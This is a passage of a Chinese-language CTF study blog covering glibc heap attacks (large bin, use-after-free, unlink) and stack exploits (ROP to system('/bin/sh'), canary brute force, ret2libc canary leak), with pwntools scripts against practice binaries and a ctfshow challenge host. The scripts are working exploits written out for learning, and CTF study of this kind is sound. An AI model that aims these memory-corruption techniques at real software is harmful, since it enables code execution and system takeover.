&quot;stack_var2 (%p): %p\\n&quot;, &amp;stack_var2, (void *)stack_var2);38 39     return 0;40 &#125;\n\nfree(p1)\nfree(p2)\n\nmalloc(0x90)\n从堆块1中切割，遍历时将堆块1放入smalbin，堆块2largebin，切割堆块1，堆块1，进入unsortbin\nfree(3)\n\n然后修改p2，size位改为0x3f1，bk_nextsize &#x3D; stack2-0x20 ,bk &#x3D; stack1-0x10\n\n malloc(0x90)\n还是从堆块1中切割，堆块1进入smallbin，堆块3进入largebin，切割堆块1，堆块1，进入unsortbin\n在堆块3挂入largebin的时候P3_size &gt; P2_size 就会执行\n\nelse\t&#123;\t\tP3-&gt;fd_nextsize = P2;  //P3的fd_nextsize要修改成P2的头指针\t\tP3-&gt;bk_nextsize = P2-&gt;bk_nextsize; //P3的bk_nextsize要修改成P2的bk_nextsize指向的地址\t\tP2-&gt;bk_nextsize = P3;  //P2的bk_nextsize要修改成P3的头指针\t\tP3-&gt;bk_nextsize-&gt;fd_nextsize = P3; //P3的bk_nextsize所指向的堆块的fd_nextsize要修改成P3的头指针\t&#125;bck = P2-&gt;bk; //bck等于P2的bk\n\n执行之前：                                                                         执行之后：\n                                    这个过程其实就是让p3加在fake_chunk2 与p2之间使得fake_chun2的fd_nextsize&#x3D;p2\n\nP2-&gt;bk_nextsize-&gt;fd_nextsize = stack_var2_addr\nP3-&gt;bk_nextsize = P2-&gt;bk_nextsize\nP3-&gt;bk_nextsize-&gt;fd_nextsize = P3\n\n那么就可以导出结论：stack_var2的值 = P3头指针，所以stack_var2变量中的内容就被修改成了P3的头指针 \n看图片中红色的字\n还有fd与bk\nbck &#x3D; P2-&gt;bk; &#x2F;&#x2F;bck等于P2的bk\n值得注意的是bck是p2的bk指针也就是fake_chunk的头部，后面p2的bk指针变了，但是bck没变还是fake_chunk的头部\n\nmark_bin(av, victim_index);P3-&gt;bk = p2-&gt;bk; //P3的bk指针要等于P2的bk指针P3-&gt;fd = P2; //P3的fd指针要等于P2的头指针P2-&gt;bk = P3; //P2的bk指针要等于P3的头指针P2-&gt;bk(fake_chunk1)-&gt;fd = P3; //P2的bk指针指向的堆块的fd指针要等于P3的头指针\n\n​       执行之前：                                                                执行之后：\n                                           \t\n这个过程其实就是让p3加在fake_chunk2与p2之间使得fake_chun1的fd&#x3D;p3\n总结：2.30版本及之前在2.30以前，缺少对largebin attack的检查，所以我们可以大胆的进行伪造，在插入一块新的largebin时，会将当前堆块的bk-&gt;fd和bk_nextsize-&gt;fd_nextsize写成当前堆块的地址，如下图，所以如果根据下图把bk构造成targetaddr1-0x10，bk_nextsize构造成targetaddr1-0x20，即可在插入largebin时（插入的要大于P2）触发unlink进行同时改写两处地址为heapaddr（插入堆块的头部）\n\n2.30之后2.30之后会进行如下两个检查\n\n这就导致在申请的堆块大于最小chunk时我们不能随意地修改bk和bk_nextsize了，为了绕过这个检查，我们要使得当前申请的堆块小于目前的最小chunk（即它是新的最小），还记得为什么吗？上文中红色的部分，因为如果它是最小它会直接被链入，没有这些乱七八糟的检查，但这也导致他只能任意写bk_nextsize指向的位置，所以在这种情况下，可以将bk_nextsize赋成targetaddr-0x20\nassert (chunk_main_arena (bck-&gt;bk));//断言bck-&gt;bk属于main_arenaif ((unsigned long) (size) &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))&#123;       fwd = bck; //这里的fwd可以粗略的认为是large_bin归属的main_arena       bck = bck-&gt;bk; //bck成了main_arena的bk指针指向的堆块       victim-&gt;fd_nextsize = fwd-&gt;fd; //我们申请的小堆块的fd_nextsize指向了main_arena的fd指针，也就是所在的large_bin的最大的堆块       victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;//攻击点，没有检测，所以我们可以伪造大堆块的bk_nextsize       fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; //先进行右值运算，如果在没有进行修改的情况下，等式可以化简为fwd-&gt;fd-&gt;bk_nextsize = victim，也就是最大堆块的bk_nextsize指向我们的最小堆块victim&#125;\n\n这段代码与unsorted_bins、large_bins有关，这是从unsorted_bins里提取出来的堆块((unsigned long) (size))与large_bins里的最小堆块((unsigned long) chunksize_nomask (bck-&gt;bk))进行比较,如果unsorted出来的堆块更小，就执行如上操作。\n所以我们先往largebin里面放一个堆块，然后unsortbin里面有个比largebin已有的小的堆块，然后申请一个比已有unsortbin打的堆块，unsortbin中的堆块就会进入largebin，完成往任意地址写堆块地址\n模板：add(0,0x450)add(1,0x428)add(2,0x440)free(0)      #0进入unsortbin  add(3,0x500) #0进入largebinfree(2)      #2进入unsortbinshow(0)libc_base = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))-0x21b0e0 #泄露libcprint(hex(libc_base))edit(0,b&#x27;a&#x27;*15+b&#x27;b&#x27;)show(0)p.recvuntil(b&#x27;ab&#x27;)addr2 = u64(p.recv(6).ljust(8, b&#x27;\\x00&#x27;)) #泄露堆块地址addr1 = addr2+0x890 #2pie = addr2-0x5290print(hex(pie))edit(0,p64(0)*3+p64(listall-0x20)) #改bk_nextadd(4,0x500)                       #2进入largebin且比largebin中的最小的堆块小\n\n例：how2heap#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;assert.h&gt;int main()&#123;  /*Disable IO buffering to prevent stream from interfering with heap*/  setvbuf(stdin,NULL,_IONBF,0);  setvbuf(stdout,NULL,_IONBF,0);  setvbuf(stderr,NULL,_IONBF,0);  size_t target = 0;  size_t *p1 = malloc(0x428);  size_t *g1 = malloc(0x18);  size_t *p2 = malloc(0x418);  size_t *g2 = malloc(0x18);  free(p1);  size_t *g3 = malloc(0x438); #p1进入largebin  free(p2);                     p1[3] = (size_t)((&amp;target)-4);  size_t *g4 = malloc(0x438); #p2进入largebin，且p2是小于p1的  assert((size_t)(p2-2) == target);  return 0;&#125;\n","categories":["堆"],"tags":["知识点"]},{"title":"UAF","url":"/2025/11/18/UAF/","content":"\n原理 :简单的说，Use After Free 就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况\n\n内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。\n内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序很有可能可以正常运转。\n内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，就很有可能会出现奇怪的问题。\n\n而我们一般所指的 Use After Free 漏洞主要是后两种。此外，我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer。\n例题  ida：unsigned int add_note()&#123;    int v0; // ebx    int i; // [esp+Ch] [ebp-1Ch]    int size; // [esp+10h] [ebp-18h]    char buf[8]; // [esp+14h] [ebp-14h] BYREF    unsigned int v5; // [esp+1Ch] [ebp-Ch]    v5 = __readgsdword(0x14u);    if ( count &lt;= 5 )    &#123;        for ( i = 0; i &lt;= 4; ++i )        &#123;            if ( !*(&amp;notelist + i) )            &#123;                *(&amp;notelist + i) = malloc(8u);                if ( !*(&amp;notelist + i) )                &#123;                    puts(&quot;Alloca Error&quot;);                    exit(-1);                &#125;                *(_DWORD *)*(&amp;notelist + i) = print_note_content;                printf(&quot;Note size :&quot;);                read(0, buf, 8u);                size = atoi(buf);                v0 = (int)*(&amp;notelist + i);                *(_DWORD *)(v0 + 4) = malloc(size);                if ( !*((_DWORD *)*(&amp;notelist + i) + 1) )                &#123;                    puts(&quot;Alloca Error&quot;);                    exit(-1);                &#125;                printf(&quot;Content :&quot;);                read(0, *((void **)*(&amp;notelist + i) + 1), size);                puts(&quot;Success !&quot;);                ++count;                return __readgsdword(0x14u) ^ v5;            &#125;        &#125;    &#125;    else    &#123;        puts(&quot;Full&quot;);    &#125;    return __readgsdword(0x14u) ^ v5;&#125;\n\n解释：\n1.申请两个堆块第一个堆块大小0x8（加上堆的头部0x10）并将堆指针所在的地址的内容写为（print_note_content）\n2.申请第二个堆块大小自己定作为用户数据段（但是也有堆头也就是0x28），并将堆指针所在地址后面四个字节写入第二个堆块的指针所指的地址\nunsigned int del_note()&#123;  int v1; // [esp+4h] [ebp-14h]  char buf[4]; // [esp+8h] [ebp-10h] BYREF  unsigned int v3; // [esp+Ch] [ebp-Ch]  v3 = __readgsdword(0x14u);  printf(&quot;Index :&quot;);  read(0, buf, 4u);  v1 = atoi(buf);  if ( v1 &lt; 0 || v1 &gt;= count )  &#123;    puts(&quot;Out of bound!&quot;);    _exit(0);  &#125;  if ( *(&amp;notelist + v1) )  &#123;    free(*((void **)*(&amp;notelist + v1) + 1));    free(*(&amp;notelist + v1));    puts(&quot;Success&quot;);  &#125;  return __readgsdword(0x14u) ^ v3;&#125;\n\n清空两个堆块，但没有将指针置零，指针变为悬挂指针\nunsigned int print_note()&#123;  int v1; // [esp+4h] [ebp-14h]  char buf[4]; // [esp+8h] [ebp-10h] BYREF  unsigned int v3; // [esp+Ch] [ebp-Ch]  v3 = __readgsdword(0x14u);  printf(&quot;Index :&quot;);  read(0, buf, 4u);  v1 = atoi(buf);  if ( v1 &lt; 0 || v1 &gt;= count )  &#123;    puts(&quot;Out of bound!&quot;);    _exit(0);  &#125;  if ( *(&amp;notelist + v1) )    (*(void (__cdecl **)(_DWORD))*(&amp;notelist + v1))(*(&amp;notelist + v1));  return __readgsdword(0x14u) ^ v3;&#125;\n\n引用后得到的函数指针所指向的函数(也就是print_note_content)，同时将 *(&amp;notelist + v1) 作为参数传递给该函数（也就是将堆块的内容打印出来）\nUAF漏洞定义堆 UAF 漏洞指的是程序在释放堆内存之后，没有将对应的指针置为 NULL，并且后续代码又对该已经释放的内存进行了访问操作。这种情况下，被释放的内存可能会被重新分配给其他对象使用，此时对原指针的访问就会导致数据混乱、程序崩溃，甚至可能被攻击者利用来执行任意代码\n原理简单的说，Use After Free 就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况\n\n内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。\n内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序很有可能可以正常运转。\n内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，就很有可能会出现奇怪的问题\n\n思路：\n申请 note0，real content size 为 16（大小与 note 大小所在的 bin 不一样即可）\n申请 note1，real content size 为 16（大小与 note 大小所在的 bin 不一样即可）\n释放 note0\n释放 note1\n此时，大小为 16 的 fast bin chunk 中链表为 note1-&gt;note0\n申请 note2，并且设置 real content 的大小为 8，那么根据堆的分配规则\nnote2 其实会分配 note1 对应的内存块。\nreal content 对应的 chunk 其实是 note0。\n如果我们这时候向 note2 real content 的 chunk 部分写入 magic 的地址，那么由于我们没有 note0 为 NULL。当我们再次尝试输出 note0 的时候，程序就会调用 magic 函数\n\nfrom pwn import *r = process(&#x27;./hacknote&#x27;)def addnote(size, content):    r.recvuntil(&quot;:&quot;)    r.sendline(&quot;1&quot;)    r.recvuntil(&quot;:&quot;)    r.sendline(str(size))    r.recvuntil(&quot;:&quot;)    r.sendline(content)def delnote(idx):    r.recvuntil(&quot;:&quot;)    r.sendline(&quot;2&quot;)    r.recvuntil(&quot;:&quot;)    r.sendline(str(idx))def printnote(idx):    r.recvuntil(&quot;:&quot;)    r.sendline(&quot;3&quot;)    r.recvuntil(&quot;:&quot;)    r.sendline(str(idx))magic = 0x08048986addnote(32, &quot;aaaa&quot;)addnote(32, &quot;ddaa&quot;)gdb.attach(r)delnote(0)delnote(1)#gdb.attach(r)addnote(8, p32(magic))#gdb.attach(r)printnote(0)r.interactive()\n\n申请四个堆块（也就是两个0，1），将两个堆块free，在申请一个（2），这时候之前申请的两个0x10的堆块就会被重新启用，先free的A的指针内的内容就会被改为后门地址，print_note（0），本来会调用print_note_content，但是内容被改为了后门地址就会调用后门的函数获得shell\n为什么不是print_note（1），因为申请一次堆块其实是申请出来了两个堆块，第二个堆块内才被写入数据，所以不是print_note（1）\n","categories":["堆"],"tags":["知识点"]},{"title":"Unlink","url":"/2025/11/18/Unlink/","content":"\n一.堆溢出unlink条件：当使用 free 函数释放一个堆块时，如果相邻的堆块（前一个或后一个）也处于空闲状态，就可能触发 unlink 操作，以将相邻的空闲堆块合并成一个更大的空闲块，从而提高内存的利用率。具体来说，如果被 free 的堆块的 P 位为 0，说明其前一个堆块为空，就会对前一个堆块进行 unlink 操作，将前一个堆块与当前被 free 的堆块进行后向合并；如果相邻的下一个堆块处于空闲状态，则会进行向前合并。\nunlink操作的实质就是：将P所指向的chunk从双向链表中移除，这里BK与FD用作临时变量\n也就是这样\n\n那具体拖链是如何实现的\nFD = P-&gt;fd;                                   \\BK = P-&gt;bk;                                   \\FD-&gt;bk = BK;                                  \\BK-&gt;fd = FD;                                  \\\n\n也就是我的上一个的下一个&#x3D;我的下一个，我的下一个的上一个&#x3D;我的上一个\nFD &#x3D; p-&gt;fd \nFD &#x3D; 堆块3chunk头所在的地址\nBK &#x3D; P-&gt;bk;\np-&gt;bk\nBK &#x3D; 堆块1chunk头所在的地址 \nFD-&gt;bk &#x3D; BK;\n堆块3的bk指针指向BK（堆块1chunk头所在地址）\nBK-&gt;fd &#x3D; FD;\n堆块1的fd指针指向FD（堆块3chunk头所在地址）\nif (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))                        malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV);\n\n这个也就是p–&gt;fd–&gt;bk &#x3D; p–&gt;bk–&gt;fd &#x3D; p\n堆块2的下一个堆块的上一个堆块 &#x3D; 堆块2的上一个堆块的下一个堆块&#x3D;堆块2\n那么如何绕过与利用呢？\n\n就解释一点吧\nchunk &#x3D; 0x602280\n为什么BK-&gt;fd &#x3D;&#x3D; *(0x602270+0x10)\n因为chunk头-0x18就是bk指针所在的地址，*（）也就是解引用bk指针的值，正常得到的是上一个堆块的chunk头所在的地址，在这里得到的就是堆块2chunk头所在的地址\n在这里BK-&gt;fd &#x3D;FD，就是*(0x602270+0x10) &#x3D; 0x602268\n也就是往chunk里面写入了chunk-0x18的值\n也就是将堆指针指向的地址改成了chunk-0x18\n然后我们往堆块2中写入东西，他就会往堆指针指向的地址里面写，也就是往这个地址里面写0x602268，顺着往下写就会写入0x602280，那么就可以将堆的指针指向的地址改为任意值，就实现任意地址写了\n我们结合题目看一下\n最最最重要的，要把头部构造在指针的位置\n触发unlink一定要伪造一个free掉的堆块在指针处，因为unlink比较是和头部比较，而数组中存储的是指针的值，所以要伪造头部在指针处才能绕过保护\n1.有打印堆块的功能add(0x80,b&#x27;chunk0&#x27;)add(0x80,b&#x27;chunk1&#x27;)#bug()payload = p64(0)+p64(0x81)+p64(0x06020C8-24)+p64(0x06020C8-16)+b&#x27;a&#x27;*0x60+p64(0x80)+p64(0x90)edit(0,0x90,payload)free(1)payload = b&#x27;a&#x27;*24+p64(elf.got[&#x27;atoi&#x27;])edit(0,len(payload),payload)\n\n申请两个在unsortbin的堆块，在堆块0中伪造一个free的堆块，并将堆块2的pre_inuse位设为0，这样就伪造堆块0为free掉的堆块，free堆块1就会触发unlink\nchunk &#x3D; 0x06020C8\nfd &#x3D; chunk-0x18\nbk &#x3D; chunk -0x10\n看一下gdb\n\n会很明显是往chunk里面写入了chunk - 0x18\n然后我们接着修改堆块的内容，也就是往chunk - 0x18中写入数据，先写0x18个垃圾数据，然后再写的就是往chunk中写，也就是往指针所在的地址写，改变指针所存储的值，也就是指针指向的地址\n我们将他写为atoi\npayload &#x3D; b’a’*24+p64(elf.got[‘atoi’])\n\n可以看到已经成功了\n此时可以泄露libc，我们打印这个堆块，就会将atoi的真实地址打印出来\n我们再次修改这个堆块的内容，也就是修改atoi的got表，把他改成system，在调用atoi的时候就会触发system，获得shell\n2.没有打印堆块的功能没有打印堆块，我们就无法泄露libc，但是我们通过都能实现任意地址写了，我们可以将free的got表改为puts\nfree堆块时候，就可以打印\n我们观察gdb，看具体是如何实现的\n将第一个堆块指针指向的地址改为free的got表\n第二个改为atoi的got表\n然后修改第二个堆块的内容为puts函数的plt表这样free堆块时候，就会打印处来堆块的内容，泄露libc\n\n然后在修改堆块2的内容为system的真实地址\n在申请一个堆块，内容写为&#x2F;bin&#x2F;sh\\x00\nfree这个堆块就可以获得shell\nadd(0x10)add(0x80)add(0x80)FD = 0x602150-24BK = 0x602150-16payload = p64(0)+p64(0x81)+p64(FD)+p64(BK)+b&#x27;a&#x27;*0x60+p64(0x80)+p64(0x90)edit(2,len(payload),payload)free(3)payload = p64(0)*2+p64(elf.got[&#x27;free&#x27;])+p64(elf.got[&#x27;atoi&#x27;])edit(2,len(payload),payload)#bug()edit(1,0x8,p64(elf.plt[&#x27;puts&#x27;]))free(2)libc_base = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))-libc.sym[&#x27;atoi&#x27;]print(hex(libc_base))system = libc_base+libc.sym[&#x27;system&#x27;]edit(1,0x8,p64(system))add(0x10)payload = b&#x27;/bin/sh\\x00&#x27;edit(4,len(payload),payload)#bug()free(4)\n\n最后：需要注意触发unlink free的堆块的上一个需要是free状态，所以我们要伪造堆块2为free状态，让后free堆块3就会触发unlink\n那具体是如何伪造的？\n我们在堆块2中再伪造一个假堆块\n使pre_size &#x3D; 0\n   size &#x3D; 0xn1(n为伪造堆块大小)\n   fd &#x3D; chunk-0x18\n   bk &#x3D; chunk-0x10\n使堆块3\n  pre_size &#x3D; 0xn0\n  size &#x3D; size(本堆块大小，0xm0) p位为0\n这样就伪造堆块2为free状态，然后free堆块3，触发unlink，实现chunk &#x3D; chunk-0x18\n当off  by one&#x2F;null时候因为会多一个字节，free后面就是puts，puts的got表就会被破坏，所以要这样子改，将puts的got表改为printf\nedit(6,b&#x27;a&#x27;*51+p64(elf.got[&#x27;free&#x27;])+p64(elf.got[&#x27;atoi&#x27;]))edit(0,p64(elf.plt[&#x27;puts&#x27;])+p64(elf.plt[&#x27;printf&#x27;]))bug()free(1)atoi = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))print(hex(atoi))libc_base = atoi-libc.sym[&#x27;atoi&#x27;]print(hex(libc_base))bug()system = libc_base +libc.sym[&#x27;system&#x27;]edit(3,&#x27;/bin/sh&#x27;)edit(0,p64(system)+p64(elf.plt[&#x27;printf&#x27;]))#bug()free(3)\n\n\n\n这里也能看到多了一个0xa\n","categories":["堆"],"tags":["知识点"]},{"title":"ctfshow 43，44","url":"/2025/01/22/ctfshow/","content":"pwn43ida：\n\n发现gets可以栈溢出（0x6c+0x4），但是并没有找到bin&#x2F;sh或sh字符串，但是有system\n\n运行gdb使用vmmap命令即可观察到各段的权限信息\n我们发现0x804b000-0x804c000是可写的\n\n-p 标志表示内存区域的权限，它由四个字符组成，每个字符分别代表一个权限：\nr：可读（Readable）w：可写（Writable）x：可执行（Executable）s：共享（Shared）\n我们在bss段找到了变量buf2是可写的\n通常情况下，BSS 段下的变量是可写的。BSS 段是用来存储未初始化的全局变量和静态变量的，操作系统在程序加载时会为这些变量分配内存并将其初始化为零或空指针。因此，BSS 段下的变量通常具有读写权限，可以被程序写入数据。\n\n思路：我们可以调用gets函数将&#x2F;bin&#x2F;sh字符串写入变量buf2，在传递给system函数的第一个参数就构造成功了system(“&#x2F;bin&#x2F;sh”)\ngets：0x08048420\nsystem：0x08048450\nexp：\nfrom pwn import*io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28119)buf2 = 0x0804B060system = 0x08048450gets = 0x08048420payload= b&#x27;a&#x27;*(0x6c+0x4)payload += p32(gets)payload += p32(system)   #作为gets函数的返回地址，返回到system函数中payload += p32(buf2)     #作为gets函数的参数（发送的/bin/sh将会被写入buf2），也是system函数的返回地址(是无效的)payload += p32(buf2)     #system函数的参数io.sendline(payload)io.sendline(b&quot;/bin/sh&quot;)io.interactive()\n\npwn44这道题思路与pwn43一样只不过是64位的，传参方式不同\n\n栈溢出（0xa+0x8）\n\nsystem：0x0400520\ngets：0x0400530\nfrom pwn import*io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28255)buf2 = 0x602080system = 0x0400520gets = 0x0400530ret = 0x00000000004004ferdi = 0x00000000004007f3payload= b&#x27;a&#x27;*(0xa+0x8)payload += p64(rdi)  payload += p64(buf2)payload += p64(gets)payload += p64(rdi)payload += p64(buf2)    payload += p64(system)    io.sendline(payload)io.sendline(b&quot;/bin/sh&quot;)io.interactive()\n\n总结pwn33，34（1）解题思路当没有bin&#x2F;sh或者sh字符串时，但是bss存在未初始化的变量，我们可以调用gets，read等函数将&#x2F;bin&#x2F;sh字符串写入将其作为system的第一个参数，构造system(“&#x2F;bin&#x2F;sh”)\n（2）64位与32位栈溢出后函数调用的不同\n32位调用函数参数全在栈上，64位前是7个参数放在寄存器里，后面的放在栈上面。\n\n32位调用函数压栈顺序是先压参数最后压返回函数，64位先是压入返回函数然后将参数放在寄存器\n\n\n","categories":["第二周"],"tags":["wp"]},{"title":"Canary爆破","url":"/2025/01/25/Canary%E7%88%86%E7%A0%B4/","content":"ctfshow53（1）checksec\n发现并没有开canary保护，其实这道题只是在栈上放了一个作用与canary类似的，程序运行过程中也会比较它的值是否改变\n思路：我们可以逐字节的将canary爆破出来\n（2）ida代码审计\n看看Canary\n\n意思就是先声明了一个指针变量  stream，打开canary.txt文件，如果没有这个文件就退出，如果有使用  fread 函数从打开的文件中读取 4 个字节的数据存储在全局变量global_canary\n看看ctfshow\n\n  将global_canary赋给s1，然后是一个while循环， 使用read函数读取字符到v2中，直至遇到换行符 \\n（ASCII码为10）停止，v5记录存储的个数，每当存储一次v5的值就+1，，然后使用  __isoc99_sscanf 函数将  v2 中的字符串转换为整数，并存储到  nbytes 中，nbytes为size_t 类型无符号型，当我们输入-1时候就会被解释为一个非常大的数（（通常是 0xFFFFFFFF，即 size_t 类型的最大值）），所以我们可以输入-1来绕过while循环，并且可以利用第二个read进行栈溢出\n最后if循环就是比较canary的值是否改变的，将s1的值与global_canary比较如果不一样输出”Error *** Stack Smashing Detected *** : Canary Value Incorrect!”并且退出，一样的话输出”Where is the flag?”\n最后flag\n\n意思就是打开flag的文件，通过puts函数将flag的值输出\n（3）思路\n先将canary逐个字节爆破出来，然后通过栈溢出返回到flag的地址就可以\n1.canary爆破爆破canary s1中储存的就是canary的值，我们可以先覆盖0x20个数据覆盖到s1，然后一个字节一个字节的去覆盖s1的值，因为只覆盖一个字节，其他的不变，通过看puts函数输出的值判断是否覆盖正确，当第一个字节正确就把他记录下来，然后爆破第二个字节时，再将第一个字节输入进去再爆破第二个字节，依次类推，这里我们可以借助脚本去爆破,粘贴一个大佬写的脚本我来解释一下\nfrom pwn import *canary = b&#x27;&#x27;                                           #定义canaryfor i in range(4):                                     #这里是两层循环，因为canary是四个字节所以外层循环4次    for j in range(0x100):                             #这个循环尝试所有可能的字节值（从 0x00 到 0xFF）        p = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28179)              p.sendlineafter(b&#x27;&gt;&#x27;,b&#x27;200&#x27;)                   #200为用户名        payload = b&#x27;a&#x27;*0x20 + canary + p8(j)           #先覆盖0x20到canary，在覆盖已经试出来前几个字节canary的值，再加上                                                         要尝试的        p.sendafter(&#x27;$ &#x27;, payload)                             ans = str(p.recv())                            #将接收的的值转化为字符串赋值给ans        if &quot;Canary Value Incorrect!&quot; not in ans:       #这个if循环是判断逐字节爆破的canary是否正确，我们知道错误就会输出                                                        Canary Value Incorrect!，如果我们接收到的数据中没有Canary Value                                                        Incorrect!就证明是正确的            canary += p8(j)                            #将新爆破出来的值加到已经爆破出来的值的后面            print(f&quot;NO:&#123;i+1&#125;  &#123;hex(j)&#125;&quot;)               #因为i是取0-3的整数，所以要+1才是canary的第几个值            break                                      #退出循环        else:            print(f&quot;try again! &#123;i&#125;:&#123;j&#125;&quot;)print(f&quot;canary: &#123;hex(u32(canary))&#125;&quot;)                   #最后将canary的值转换为32位输出出来\n\n2.栈溢出exp\nfrom pwn import *p=remote(&#x27;pwn.challenge.ctf.show&#x27;,28179)canary=0x21443633                              #canary上面爆破过了，我们直接输入就可以，前提是canary的值是固定的flag=0x08048696p.recvuntil(b&#x27;How many bytes do you want to write to the buffer?\\n&gt;&#x27;)  p.sendline(b&#x27;-1&#x27;)                              #绕过while循环，并使得可以借助read函数栈溢出p.recvuntil(b&#x27;$ &#x27;)                            pay=b&#x27;a&#x27;*0x20+p32(canary)+b&#x27;a&#x27;*(0xc+0x4)+p32(flag) #payload=覆盖到s1+canary+覆盖到返回地址+返回地址p.sendline(pay)p.interactive()\n\n参考文章ctfshowpwn 45 -＞ 90（已更新33）栈溢出_pwn59-CSDN博客\ncanary保护和pie保护的绕过_ctfshow pwn入门-CSDN博客\n","categories":["第二周"],"tags":["wp"]},{"title":"2024湘岚杯ezlibc","url":"/2025/01/18/ezlibc/","content":"前言\n\n本题是Canary保护+ret2libc，根据这个题目来总结一下canary保护和ret2libc\nCanary保护（1）Canary介绍Canary 的意思是金丝雀，来源于英国矿井工人用来探查井下气体是否有毒的金丝雀笼子。工人们每次下井都会带上一只金丝雀。如果井下的气体有毒，金丝雀由于对毒性敏感就会停止鸣叫甚至死亡，从而使工人们得到预警。\n（2）Canary原理当函数开始执行时，会在内存某处插入一组随机数canary（一般是 寄存器fs: 0x28 处，栈中 %ebp-0x8 的位置），我们在直接进行栈溢出时canary的值就会改变，在函数退栈返回前，程序会比对栈上的canary副本和原始的canary。如果二者不同，则说明发生了栈溢出，这时程序会直接崩溃，调用__stack_chk_fail函数来终止程序\n\n\n（3）Canary绕过我们知道在进行栈溢出时Canary的值已经改变，但函数退栈返回前程序会比对Canary的值，我们可以先把Canary泄露出来，进行栈溢出时候，再把Canary的值发送，这样Canary的值就不会改变\n（4）Canary特点Canary所生成的随机数有一个非常重要的特点：随机数的第一个字节必然是 0x00。如此设计的主要目的是实现字符串截断，当我们进行泄露时遇到0x00直接就停止了，但是我们进行栈溢出时，可以多发送一个字节，使\\x00被覆盖，这样我们就可以成功的将Canary泄露出来\nret2libc（1）题目特点进行栈溢出时，程序可能没有后门函数，可能既没有system函数，又没有”&#x2F;bin&#x2F;sh”字符串，我们就无法拿到shell，但是我们可以借助libc库将其真实地址计算出来\n（2）解题思路我们知道函数的真实地址  &#x3D;  基地址  +  偏移地址 ，如果我们知道每次程序运行的基地址，以及每个函数的偏移地址，我们就可以计算出函数的真实地址\n基地址：每次运行程序加载函数时，函数的基地址都会发生改变\n偏移地址：libc库中存放的就是这些函数的偏移地址，函数真实地址的后三位不会变化，根据其最后三位借助，可以判断出libc库的版本\n查询libc版本网站：libc database search\n使用方法：输入函数名称和真实地址\n如何计算基地址：\n我们知道基地址 &#x3D; 函数的真实地址 - 偏移地址\n我们可以借助puts(),write()这样的函数将某个函数的真实地址打印出来（即got表中存放的地址），由于Linux的动态延迟绑定技术，我们必须选择一个main函数中已经执行过的函数，一般选择puts和write\n（4）plt表和got表 PLT表（Procedure Linkage Table）：PLT表用于实现函数调用的延迟绑定。当程序调用一个外部函数时，首先会跳转到PLT表中的相应条目，PLT表中的代码会检查GOT表中该函数地址是否已经解析。如果已经解析，就直接跳转到GOT表中的实际函数地址；如果尚未解析，就会触发动态链接器进行解析操作，然后更新GOT表并完成函数调用\nGOT表（Global Offset Table）：GOT表用于存放外部函数和全局变量的地址。GOT表在动态链接过程中起着关键作用，它允许程序在运行时查找和调用外部函数。\n在这里引用一张大佬的图解释\n\n（5）延迟绑定定义：延迟绑定（Lazy Binding）是一种在程序运行过程中动态链接共享库函数的技术。它的核心思想是推迟对外部函数（位于共享库中的函数）的地址解析，直到程序首次调用该函数时才进行解析。这样做的主要目的是为了提高程序的启动速度，因为如果在程序启动时就对所有可能用到的外部函数进行地址解析，会花费大量时间，而且很多函数可能在程序运行过程中根本不会被调用\n调用函数A的过程\n首次调用：\n\n再次调用:\n\n（6）总结1.找到一个main函数中已经执行过的函数，构造payload1调用puts或write将其真实地址打印出来，根据真实地址确定libc版本，以及函数的偏移地址\n2.根据基地址&#x3D;真实地址-偏移地址\n3.根据真实地址&#x3D;基地址+偏移地址算出system函数和”&#x2F;bin&#x2F;sh”字符串的真实地址\n4.构造payload2，劫持程序，拿到shell\nexp以及解释from pwn import *from LibcSearcher import *io=process(&#x27;./ezlibc&#x27;)elf=ELF(&quot;./ezlibc&quot;)io=remote(&#x27;xlctf.huhstsec.top&#x27;,40657)context(arch=&quot;amd64&quot;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)#payload1:泄露canarypayload1=b&#x27;a&#x27;*(0x30-0x8)+b&#x27;b&#x27;                                 #多发送一个b来覆盖canary的\\x00io.recvuntil(b&#x27;flag!&#x27;)io.send(payload1);                                            #这里不能用sendline，因为回车会占字节io.recvuntil(b&#x27;ab&#x27;)                                           #定位到Canary之前canary=u64(b&#x27;\\x00&#x27;+io.recv(7))                                #接受canary将\\x00重新填上，再接受7个字节，并转换为64位print(&#x27;canary:&#x27;,hex(canary))pop_rdi_ret_addr=0x400843ret_addr=0x000000000040059e               puts_plt=elf.plt[&#x27;puts&#x27;]                                      #查找puts函数plt表的地址main_addr=0x4006e7puts_got=elf.got[&quot;puts&quot;]                                      #查找puts函数got表的地址print(&quot;puts_plt:&quot;,hex(puts_plt))print(&quot;plt_got:&quot;,hex(puts_got))#payload2:泄露puts真实地址payload2=b&#x27;a&#x27;*(0x30-8)+p64(canary)+b&#x27;a&#x27;*8                     #先覆盖到到canary之前，再将canary发送payload2+=p64(pop_rdi_ret_addr)+p64(puts_got)                 #将puts函数got表的地址储存在寄存器rdi里  